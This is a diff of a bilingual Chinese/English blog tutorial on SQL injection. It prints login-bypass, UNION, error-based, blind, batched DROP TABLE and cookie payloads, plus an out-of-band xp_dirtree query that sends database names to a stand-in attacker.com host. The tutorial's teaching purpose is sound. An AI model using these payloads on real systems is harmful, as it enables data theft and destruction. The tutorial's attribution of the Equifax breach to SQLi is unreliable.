@@ -9,12 +9,12 @@
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="SQL InjectionSQL Injection 簡介 &#x2F; Introduction to SQL InjectionSQL Injection (SQLi) 是一種常見的 web security vulnerability（網頁安全漏洞），允許攻擊者通過操縱應用程式與其 database（資料庫）之間的 SQL queries（SQL 查詢）來執行惡意操作。這種漏洞可能導致敏感資">
+  <meta name="description" content="SQL InjectionSQL Injection 簡介 &#x2F; Introduction to SQL InjectionSQL Injection (SQLi) 是一種常見的 web security vulnerability（網頁安全漏洞），允許攻擊者通過操縱應用程式與其 database（資料庫）之間的 SQL queries（SQL 查詢）來執行惡意操作。這種漏洞可能導致敏感資料外洩，例">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL Injection">
 <meta property="og:url" content="https://no-flag.com/2025/05/06/SQLI/index.html">
 <meta property="og:site_name" content="HackThe4O4">
-<meta property="og:description" content="SQL InjectionSQL Injection 簡介 &#x2F; Introduction to SQL InjectionSQL Injection (SQLi) 是一種常見的 web security vulnerability（網頁安全漏洞），允許攻擊者通過操縱應用程式與其 database（資料庫）之間的 SQL queries（SQL 查詢）來執行惡意操作。這種漏洞可能導致敏感資">
+<meta property="og:description" content="SQL InjectionSQL Injection 簡介 &#x2F; Introduction to SQL InjectionSQL Injection (SQLi) 是一種常見的 web security vulnerability（網頁安全漏洞），允許攻擊者通過操縱應用程式與其 database（資料庫）之間的 SQL queries（SQL 查詢）來執行惡意操作。這種漏洞可能導致敏感資料外洩，例">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-05-06T14:53:07.510Z">
 <meta property="article:modified_time" content="2025-05-06T14:56:24.013Z">
@@ -161,7 +161,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><h2 id="SQL-Injection-簡介-Introduction-to-SQL-Injection"><a href="#SQL-Injection-簡介-Introduction-to-SQL-Injection" class="headerlink" title="SQL Injection 簡介 &#x2F; Introduction to SQL Injection"></a>SQL Injection 簡介 &#x2F; Introduction to SQL Injection</h2><p>SQL Injection (SQLi) 是一種常見的 <strong>web security vulnerability</strong>（網頁安全漏洞），允許攻擊者通過操縱應用程式與其 <strong>database</strong>（資料庫）之間的 <strong>SQL queries</strong>（SQL 查詢）來執行惡意操作。這種漏洞可能導致敏感資料外洩，例如 <strong>passwords</strong>（密碼）、<strong>credit card details</strong>（信用卡資訊）或 <strong>personal user information</strong>（個人用戶資訊）。攻擊者還可能修改或刪除資料，造成應用程式行為的持久性改變，甚至危害底層伺服器或執行 <strong>denial-of-service (DoS) attacks</strong>（拒絕服務攻擊）。</p>
+        <h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><h2 id="SQL-Injection-簡介-Introduction-to-SQL-Injection"><a href="#SQL-Injection-簡介-Introduction-to-SQL-Injection" class="headerlink" title="SQL Injection 簡介 / Introduction to SQL Injection"></a>SQL Injection 簡介 / Introduction to SQL Injection</h2><p>SQL Injection (SQLi) 是一種常見的 <strong>web security vulnerability</strong>（網頁安全漏洞），允許攻擊者通過操縱應用程式與其 <strong>database</strong>（資料庫）之間的 <strong>SQL queries</strong>（SQL 查詢）來執行惡意操作。這種漏洞可能導致敏感資料外洩，例如 <strong>passwords</strong>（密碼）、<strong>credit card details</strong>（信用卡資訊）或 <strong>personal user information</strong>（個人用戶資訊）。攻擊者還可能修改或刪除資料，造成應用程式行為的持久性改變，甚至危害底層伺服器或執行 <strong>denial-of-service (DoS) attacks</strong>（拒絕服務攻擊）。</p>
 <p>以下是 SQLi 的關鍵要點：</p>
 <ul>
 <li><strong>普遍性</strong>：SQLi 是網頁應用程式中最常見的漏洞之一，影響許多未妥善處理使用者輸入的系統。</li>
@@ -169,14 +169,12 @@
 <li><strong>防禦方法</strong>：使用 <strong>parameterized queries</strong>（參數化查詢）和輸入驗證可顯著降低風險。</li>
 <li><strong>爭議性</strong>：雖然防禦技術已成熟，但許多開發者仍未正確實施，導致漏洞持續存在。</li>
 </ul>
-<h3 id="為什麼會發生-SQLi？-Why-Does-SQLi-Happen"><a href="#為什麼會發生-SQLi？-Why-Does-SQLi-Happen" class="headerlink" title="為什麼會發生 SQLi？ &#x2F; Why Does SQLi Happen?"></a>為什麼會發生 SQLi？ &#x2F; Why Does SQLi Happen?</h3><p>SQLi 通常發生在應用程式直接將使用者輸入拼接到 <strong>SQL queries</strong> 中，而未進行適當的驗證或參數化。例如，假設一個登錄系統使用以下查詢：</p>
+<h3 id="為什麼會發生-SQLi？-Why-Does-SQLi-Happen"><a href="#為什麼會發生-SQLi？-Why-Does-SQLi-Happen" class="headerlink" title="為什麼會發生 SQLi？ / Why Does SQLi Happen?"></a>為什麼會發生 SQLi？ / Why Does SQLi Happen?</h3><p>SQLi 通常發生在應用程式直接將使用者輸入拼接到 <strong>SQL queries</strong> 中，而未進行適當的驗證或參數化。例如，假設一個登錄系統使用以下查詢：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;輸入用戶名&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;輸入密碼&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
 <p>如果攻擊者輸入 <code>admin&#39; OR &#39;1&#39;=&#39;1</code> 作為用戶名，查詢可能變為：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
 <p>由於 <code>&#39;1&#39;=&#39;1&#39;</code> 永遠為真，攻擊者可繞過密碼檢查，獲得未授權訪問。</p>
-<h3 id="SQLi-的影響-Impact-of-SQLi"><a href="#SQLi-的影響-Impact-of-SQLi" class="headerlink" title="SQLi 的影響 &#x2F; Impact of SQLi"></a>SQLi 的影響 &#x2F; Impact of SQLi</h3><p>成功的 SQLi 攻擊可能導致：</p>
+<h3 id="SQLi-的影響-Impact-of-SQLi"><a href="#SQLi-的影響-Impact-of-SQLi" class="headerlink" title="SQLi 的影響 / Impact of SQLi"></a>SQLi 的影響 / Impact of SQLi</h3><p>成功的 SQLi 攻擊可能導致：</p>
 <ul>
 <li><strong>敏感資料外洩</strong>：如用戶密碼、信用卡號或個人資訊。</li>
 <li><strong>資料損壞</strong>：攻擊者可修改或刪除資料庫內容，影響應用程式功能。</li>
@@ -185,7 +183,7 @@
 </ul>
 <p>例如，2017 年的 <a target="_blank" rel="noopener" href="https://www.csoonline.com/article/567131/equifax-data-breach-faq-what-happened-who-was-affected-what-was-the-impact.html">Equifax 資料外洩事件</a> 因 SQLi 漏洞導致 1.47 億用戶資料被盜，造成數億美元損失。</p>
 <hr>
-<h2 id="SQL-與資料庫基礎-Basics-of-SQL-and-Databases"><a href="#SQL-與資料庫基礎-Basics-of-SQL-and-Databases" class="headerlink" title="SQL 與資料庫基礎 &#x2F; Basics of SQL and Databases"></a>SQL 與資料庫基礎 &#x2F; Basics of SQL and Databases</h2><h3 id="什麼是-SQL？-What-is-SQL"><a href="#什麼是-SQL？-What-is-SQL" class="headerlink" title="什麼是 SQL？ &#x2F; What is SQL?"></a>什麼是 SQL？ &#x2F; What is SQL?</h3><p>SQL（Structured Query Language，結構化查詢語言）是一種用於管理 <strong>relational databases</strong>（關聯式資料庫）的語言。資料庫由 <strong>tables</strong>（表格）組成，每個表格包含 <strong>rows</strong>（行）和 <strong>columns</strong>（列），類似試算表。例如，<code>users</code> 表格可能包含 <code>id</code>、<code>username</code>、<code>password</code> 和 <code>email</code> 等列。</p>
+<h2 id="SQL-與資料庫基礎-Basics-of-SQL-and-Databases"><a href="#SQL-與資料庫基礎-Basics-of-SQL-and-Databases" class="headerlink" title="SQL 與資料庫基礎 / Basics of SQL and Databases"></a>SQL 與資料庫基礎 / Basics of SQL and Databases</h2><h3 id="什麼是-SQL？-What-is-SQL"><a href="#什麼是-SQL？-What-is-SQL" class="headerlink" title="什麼是 SQL？ / What is SQL?"></a>什麼是 SQL？ / What is SQL?</h3><p>SQL（Structured Query Language，結構化查詢語言）是一種用於管理 <strong>relational databases</strong>（關聯式資料庫）的語言。資料庫由 <strong>tables</strong>（表格）組成，每個表格包含 <strong>rows</strong>（行）和 <strong>columns</strong>（列），類似試算表。例如，<code>users</code> 表格可能包含 <code>id</code>、<code>username</code>、<code>password</code> 和 <code>email</code> 等列。</p>
 <p>SQL 提供以下核心操作：</p>
 <ul>
 <li><strong>SELECT</strong>：從資料庫檢索資料。</li>
@@ -193,41 +191,34 @@
 <li><strong>UPDATE</strong>：更新現有資料。</li>
 <li><strong>DELETE</strong>：刪除資料。</li>
 </ul>
-<h3 id="為什麼攻擊者針對-SELECT-FROM？-Why-Do-Attackers-Target-SELECT-FROM"><a href="#為什麼攻擊者針對-SELECT-FROM？-Why-Do-Attackers-Target-SELECT-FROM" class="headerlink" title="為什麼攻擊者針對 SELECT * FROM？ &#x2F; Why Do Attackers Target SELECT * FROM?"></a>為什麼攻擊者針對 <code>SELECT * FROM</code>？ &#x2F; Why Do Attackers Target <code>SELECT * FROM</code>?</h3><p><code>SELECT * FROM</code> 是 SQL 中最常用的查詢結構，用於檢索資料：</p>
+<h3 id="為什麼攻擊者針對-SELECT-FROM？-Why-Do-Attackers-Target-SELECT-FROM"><a href="#為什麼攻擊者針對-SELECT-FROM？-Why-Do-Attackers-Target-SELECT-FROM" class="headerlink" title="為什麼攻擊者針對 SELECT * FROM？ / Why Do Attackers Target SELECT * FROM?"></a>為什麼攻擊者針對 <code>SELECT * FROM</code>？ / Why Do Attackers Target <code>SELECT * FROM</code>?</h3><p><code>SELECT * FROM</code> 是 SQL 中最常用的查詢結構，用於檢索資料：</p>
 <ul>
-<li>**<code>SELECT</code>**：指示資料庫檢索資料。</li>
-<li>**<code>*</code>**：通配符，表示「所有列」。</li>
-<li>**<code>FROM</code>**：指定目標表格。</li>
+<li><strong><code>SELECT</code></strong>：指示資料庫檢索資料。</li>
+<li><strong><code>*</code></strong>：通配符，表示「所有列」。</li>
+<li><strong><code>FROM</code></strong>：指定目標表格。</li>
 </ul>
 <p>例如：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>
-
 <p>這會返回 <code>users</code> 表格中的所有資料。攻擊者常針對此結構，因為它允許一次提取表格中的所有敏感資訊，如密碼或信用卡號。</p>
-<h3 id="UNION-在-SQLi-中的作用-Role-of-UNION-in-SQLi"><a href="#UNION-在-SQLi-中的作用-Role-of-UNION-in-SQLi" class="headerlink" title="UNION 在 SQLi 中的作用 &#x2F; Role of UNION in SQLi"></a><code>UNION</code> 在 SQLi 中的作用 &#x2F; Role of <code>UNION</code> in SQLi</h3><p><code>UNION</code> 是 SQL 中的操作符，用於合併多個 <strong>SELECT</strong> 查詢的結果。攻擊者利用 <code>UNION</code> 將惡意查詢的結果附加到原始查詢，從而提取其他表格的資料。</p>
+<h3 id="UNION-在-SQLi-中的作用-Role-of-UNION-in-SQLi"><a href="#UNION-在-SQLi-中的作用-Role-of-UNION-in-SQLi" class="headerlink" title="UNION 在 SQLi 中的作用 / Role of UNION in SQLi"></a><code>UNION</code> 在 SQLi 中的作用 / Role of <code>UNION</code> in SQLi</h3><p><code>UNION</code> 是 SQL 中的操作符，用於合併多個 <strong>SELECT</strong> 查詢的結果。攻擊者利用 <code>UNION</code> 將惡意查詢的結果附加到原始查詢，從而提取其他表格的資料。</p>
 <p>例如，假設原始查詢為：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name, description <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
 <p>攻擊者輸入：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Gifts<span class="string">&#x27; UNION SELECT username, password FROM users--</span></span><br></pre></td></tr></table></figure>
-
 <p>查詢變為：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name, description <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users<span class="comment">--;</span></span><br></pre></td></tr></table></figure>
-
 <p>這裡，<code>--</code> 是 SQL 的 <strong>comment indicator</strong>（註釋符號），忽略後續內容。結果將包含產品資料以及用戶名和密碼。</p>
-<h3 id="SQLi-的工作原理-How-SQL-Injection-Works"><a href="#SQLi-的工作原理-How-SQL-Injection-Works" class="headerlink" title="SQLi 的工作原理 &#x2F; How SQL Injection Works"></a>SQLi 的工作原理 &#x2F; How SQL Injection Works</h3><p>SQLi 利用應用程式未正確處理使用者輸入的漏洞，將惡意 SQL 代碼注入查詢中。例如，假設一個產品查詢：</p>
+<h3 id="SQLi-的工作原理-How-SQL-Injection-Works"><a href="#SQLi-的工作原理-How-SQL-Injection-Works" class="headerlink" title="SQLi 的工作原理 / How SQL Injection Works"></a>SQLi 的工作原理 / How SQL Injection Works</h3><p>SQLi 利用應用程式未正確處理使用者輸入的漏洞，將惡意 SQL 代碼注入查詢中。例如，假設一個產品查詢：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;輸入類別&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
 <p>如果攻擊者輸入 <code>Gifts&#39; OR &#39;1&#39;=&#39;1--</code>，查詢變為：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1--&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
 <p>由於 <code>&#39;1&#39;=&#39;1&#39;</code> 永遠為真，查詢返回所有產品，包括未公開的產品。</p>
 <hr>
-<h2 id="SQL-Injection-攻擊類型-Types-of-SQL-Injection-Attacks"><a href="#SQL-Injection-攻擊類型-Types-of-SQL-Injection-Attacks" class="headerlink" title="SQL Injection 攻擊類型 &#x2F; Types of SQL Injection Attacks"></a>SQL Injection 攻擊類型 &#x2F; Types of SQL Injection Attacks</h2><p>SQLi 攻擊可分為三大類：<strong>In-band SQLi</strong>（同頻道攻擊）、<strong>Inferential SQLi</strong>（盲注）和 <strong>Out-of-band SQLi</strong>（異頻道攻擊）。以下詳細介紹每種類型及其子類型，並解釋相關指令的功用。</p>
-<h3 id="1-In-band-SQLi（同頻道攻擊）-In-band-SQLi"><a href="#1-In-band-SQLi（同頻道攻擊）-In-band-SQLi" class="headerlink" title="1. In-band SQLi（同頻道攻擊） &#x2F; In-band SQLi"></a>1. In-band SQLi（同頻道攻擊） &#x2F; In-band SQLi</h3><p>攻擊者通過與應用程式相同的通道發送惡意 SQL 並接收結果。這是最直接的攻擊方式。</p>
+<h2 id="SQL-Injection-攻擊類型-Types-of-SQL-Injection-Attacks"><a href="#SQL-Injection-攻擊類型-Types-of-SQL-Injection-Attacks" class="headerlink" title="SQL Injection 攻擊類型 / Types of SQL Injection Attacks"></a>SQL Injection 攻擊類型 / Types of SQL Injection Attacks</h2><p>SQLi 攻擊可分為三大類：<strong>In-band SQLi</strong>（同頻道攻擊）、<strong>Inferential SQLi</strong>（盲注）和 <strong>Out-of-band SQLi</strong>（異頻道攻擊）。以下詳細介紹每種類型及其子類型，並解釋相關指令的功用。</p>
+<h3 id="1-In-band-SQLi（同頻道攻擊）-In-band-SQLi"><a href="#1-In-band-SQLi（同頻道攻擊）-In-band-SQLi" class="headerlink" title="1. In-band SQLi（同頻道攻擊） / In-band SQLi"></a>1. In-band SQLi（同頻道攻擊） / In-band SQLi</h3><p>攻擊者通過與應用程式相同的通道發送惡意 SQL 並接收結果。這是最直接的攻擊方式。</p>
 <h4 id="a-Error-based-SQLi（錯誤回顯注入）"><a href="#a-Error-based-SQLi（錯誤回顯注入）" class="headerlink" title="a. Error-based SQLi（錯誤回顯注入）"></a>a. Error-based SQLi（錯誤回顯注入）</h4><p><strong>原理</strong>：利用資料庫錯誤訊息洩漏敏感資訊，如資料庫版本或結構。</p>
 <p><strong>範例</strong>：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; AND 1=CONVERT(int, (SELECT @@version))--;</span></span><br></pre></td></tr></table></figure>
-
 <ul>
 <li><strong>CONVERT</strong>：這是 SQL Server 中的函數，用於將資料類型轉換為另一種（例如將字串轉為整數）。在這裡，<code>CONVERT(int, (SELECT @@version))</code> 試圖將資料庫版本（字串）轉為整數，導致錯誤並洩漏版本資訊（如「5.7.32」）。</li>
 </ul>
@@ -236,16 +227,14 @@
 <h4 id="b-Union-based-SQLi（聯合查詢注入）"><a href="#b-Union-based-SQLi（聯合查詢注入）" class="headerlink" title="b. Union-based SQLi（聯合查詢注入）"></a>b. Union-based SQLi（聯合查詢注入）</h4><p><strong>原理</strong>：使用 <code>UNION</code> 將惡意查詢結果與原始查詢結果合併。</p>
 <p><strong>範例</strong>：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name, description <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users<span class="comment">--;</span></span><br></pre></td></tr></table></figure>
-
 <ul>
 <li><strong>UNION</strong>：合併兩個 <strong>SELECT</strong> 查詢的結果，必須具有相同的列數和資料類型。攻擊者利用這點提取其他表格（如 <code>users</code>）的資料。</li>
 </ul>
 <p><strong>實際案例</strong>：零售網站可能因未過濾輸入而洩漏客戶資料，導致身份盜竊。</p>
-<h3 id="2-Inferential-SQLi（盲注）-Inferential-SQLi-Blind-SQLi"><a href="#2-Inferential-SQLi（盲注）-Inferential-SQLi-Blind-SQLi" class="headerlink" title="2. Inferential SQLi（盲注） &#x2F; Inferential SQLi (Blind SQLi)"></a>2. Inferential SQLi（盲注） &#x2F; Inferential SQLi (Blind SQLi)</h3><p>當應用程式不返回查詢結果或錯誤訊息時，攻擊者通過間接方式推斷資料庫資訊。</p>
+<h3 id="2-Inferential-SQLi（盲注）-Inferential-SQLi-Blind-SQLi"><a href="#2-Inferential-SQLi（盲注）-Inferential-SQLi-Blind-SQLi" class="headerlink" title="2. Inferential SQLi（盲注） / Inferential SQLi (Blind SQLi)"></a>2. Inferential SQLi（盲注） / Inferential SQLi (Blind SQLi)</h3><p>當應用程式不返回查詢結果或錯誤訊息時，攻擊者通過間接方式推斷資料庫資訊。</p>
 <h4 id="a-Boolean-based-Blind-SQLi（布林盲注）"><a href="#a-Boolean-based-Blind-SQLi（布林盲注）" class="headerlink" title="a. Boolean-based Blind SQLi（布林盲注）"></a>a. Boolean-based Blind SQLi（布林盲注）</h4><p><strong>原理</strong>：根據查詢條件為真或假時應用程式的不同響應，推斷資料。</p>
 <p><strong>範例</strong>：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>) <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li><strong>AND</strong>：邏輯運算符，僅當兩個條件均為真時返回結果。攻擊者通過改變條件（如 <code>username = &#39;admin&#39;</code>）並觀察頁面響應（如正常或錯誤），推斷是否存在名為 <code>admin</code> 的用戶。</li>
 </ul>
@@ -253,16 +242,14 @@
 <h4 id="b-Time-based-Blind-SQLi（時間盲注）"><a href="#b-Time-based-Blind-SQLi（時間盲注）" class="headerlink" title="b. Time-based Blind SQLi（時間盲注）"></a>b. Time-based Blind SQLi（時間盲注）</h4><p><strong>原理</strong>：通過注入導致查詢延遲的代碼，根據響應時間推斷條件真假。</p>
 <p><strong>範例</strong>：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> IF((<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>), SLEEP(<span class="number">5</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li><strong>IF</strong>：條件語句，根據條件執行不同操作。在 MySQL 中，<code>IF(condition, true_action, false_action)</code> 檢查條件是否為真。</li>
 <li><strong>SLEEP</strong>：MySQL 函數，暫停查詢執行指定秒數（如 <code>SLEEP(5)</code> 延遲 5 秒）。如果響應延遲，則條件為真。</li>
 </ul>
 <p><strong>實際案例</strong>：攻擊者可通過延遲推斷資料庫內容，適用於無視覺反饋的系統。</p>
-<h3 id="3-Out-of-band-SQLi（異頻道攻擊）-Out-of-band-SQLi"><a href="#3-Out-of-band-SQLi（異頻道攻擊）-Out-of-band-SQLi" class="headerlink" title="3. Out-of-band SQLi（異頻道攻擊） &#x2F; Out-of-band SQLi"></a>3. Out-of-band SQLi（異頻道攻擊） &#x2F; Out-of-band SQLi</h3><p><strong>原理</strong>：當無法通過同一通道獲取資料時，利用資料庫的外部功能（如 DNS 或 HTTP 請求）傳輸資料。</p>
+<h3 id="3-Out-of-band-SQLi（異頻道攻擊）-Out-of-band-SQLi"><a href="#3-Out-of-band-SQLi（異頻道攻擊）-Out-of-band-SQLi" class="headerlink" title="3. Out-of-band SQLi（異頻道攻擊） / Out-of-band SQLi"></a>3. Out-of-band SQLi（異頻道攻擊） / Out-of-band SQLi</h3><p><strong>原理</strong>：當無法通過同一通道獲取資料時，利用資料庫的外部功能（如 DNS 或 HTTP 請求）傳輸資料。</p>
 <p><strong>範例</strong>：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@host</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@host</span> <span class="operator">=</span> (<span class="keyword">SELECT</span> TOP <span class="number">1</span> name <span class="keyword">FROM</span> master..sysdatabases);</span><br><span class="line"><span class="keyword">EXEC</span>(<span class="string">&#x27;master..xp_dirtree &quot;\\&#x27;</span> <span class="operator">+</span> <span class="variable">@host</span> <span class="operator">+</span> <span class="string">&#x27;.attacker.com\share&quot;&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li><strong>DECLARE</strong>：在 SQL Server 中定義變數（如 <code>@host</code>）。</li>
 <li><strong>SET</strong>：為變數賦值，這裡提取資料庫名稱。</li>
@@ -272,145 +259,153 @@
 <h3 id="4-Second-order-SQLi（二階-SQL-注入）"><a href="#4-Second-order-SQLi（二階-SQL-注入）" class="headerlink" title="4. Second-order SQLi（二階 SQL 注入）"></a>4. Second-order SQLi（二階 SQL 注入）</h3><p><strong>原理</strong>：惡意輸入被存儲在資料庫，後續在不安全的查詢中使用。</p>
 <p><strong>範例</strong>：用戶註冊時輸入用戶名 <code>admin&#39;--</code>，後續查詢為：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span><span class="comment">--&#x27;;</span></span><br></pre></td></tr></table></figure>
-
 <ul>
-<li>**–**：SQL 註釋符號，忽略後續查詢內容，導致繞過安全檢查。</li>
+<li><strong>—</strong>：SQL 註釋符號，忽略後續查詢內容，導致繞過安全檢查。</li>
 </ul>
 <p><strong>實際案例</strong>：論壇存儲惡意用戶名可能在管理查詢中觸發未授權操作。</p>
 <h3 id="5-Batched-Queries（批處理查詢）"><a href="#5-Batched-Queries（批處理查詢）" class="headerlink" title="5. Batched Queries（批處理查詢）"></a>5. Batched Queries（批處理查詢）</h3><p><strong>原理</strong>：在單一請求中執行多個 SQL 語句，執行破壞性操作。</p>
 <p><strong>範例</strong>：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">105</span>; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> suppliers;</span><br></pre></td></tr></table></figure>
-
 <ul>
-<li>**;**：SQL 語句分隔符，允許執行多個查詢。</li>
+<li><strong>;</strong>：SQL 語句分隔符，允許執行多個查詢。</li>
 <li><strong>DROP TABLE</strong>：刪除指定表格（如 <code>suppliers</code>）。</li>
 </ul>
 <p><strong>實際案例</strong>：攻擊者可刪除關鍵資料庫結構，造成資料丟失。</p>
 <h3 id="6-Cookie-based-SQLi（基於-Cookie-的注入）"><a href="#6-Cookie-based-SQLi（基於-Cookie-的注入）" class="headerlink" title="6. Cookie-based SQLi（基於 Cookie 的注入）"></a>6. Cookie-based SQLi（基於 Cookie 的注入）</h3><p><strong>原理</strong>：利用 <strong>HTTP cookies</strong> 中的輸入執行 SQLi，當應用程式將 cookie 值用於查詢時觸發。</p>
 <p><strong>範例</strong>：假設應用程式使用 cookie 中的 <code>user_id</code>：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $cookie_user_id;</span><br></pre></td></tr></table></figure>
-
 <p>攻擊者修改 cookie 為 <code>105 OR 1=1--</code>，查詢變為：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">105</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--;</span></span><br></pre></td></tr></table></figure>
-
 <p><strong>實際案例</strong>：攻擊者可通過修改瀏覽器 cookie 繞過身份驗證。</p>
 <h3 id="7-Error-based-Data-Extraction（基於錯誤的資料提取）"><a href="#7-Error-based-Data-Extraction（基於錯誤的資料提取）" class="headerlink" title="7. Error-based Data Extraction（基於錯誤的資料提取）"></a>7. Error-based Data Extraction（基於錯誤的資料提取）</h3><p><strong>原理</strong>：利用特定資料庫函數觸發錯誤，洩漏資料。</p>
 <p><strong>範例</strong>（MySQL）：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;foo&#x27;</span> <span class="keyword">WHERE</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> EXTRACTVALUE(<span class="number">1</span>, CONCAT(<span class="number">0x5c</span>, (<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>)));</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li><strong>EXTRACTVALUE</strong>：MySQL 函數，用於解析 XML，這裡用於觸發錯誤並洩漏 <code>password</code> 值。</li>
 <li><strong>CONCAT</strong>：串接字串，這裡將反斜杠（<code>0x5c</code>）與密碼結合，造成錯誤訊息洩漏。</li>
 </ul>
 <p><strong>實際案例</strong>：攻擊者可提取敏感欄位值，無需直接查詢結果。</p>
 <hr>
-<h2 id="檢測-SQL-Injection-漏洞-Detecting-SQL-Injection-Vulnerabilities"><a href="#檢測-SQL-Injection-漏洞-Detecting-SQL-Injection-Vulnerabilities" class="headerlink" title="檢測 SQL Injection 漏洞 &#x2F; Detecting SQL Injection Vulnerabilities"></a>檢測 SQL Injection 漏洞 &#x2F; Detecting SQL Injection Vulnerabilities</h2><p>檢測 SQLi 需要系統性測試應用程式的每個 <strong>entry point</strong>（輸入點）。以下是常見方法：</p>
+<h2 id="檢測-SQL-Injection-漏洞-Detecting-SQL-Injection-Vulnerabilities"><a href="#檢測-SQL-Injection-漏洞-Detecting-SQL-Injection-Vulnerabilities" class="headerlink" title="檢測 SQL Injection 漏洞 / Detecting SQL Injection Vulnerabilities"></a>檢測 SQL Injection 漏洞 / Detecting SQL Injection Vulnerabilities</h2><p>檢測 SQLi 需要系統性測試應用程式的每個 <strong>entry point</strong>（輸入點）。以下是常見方法：</p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
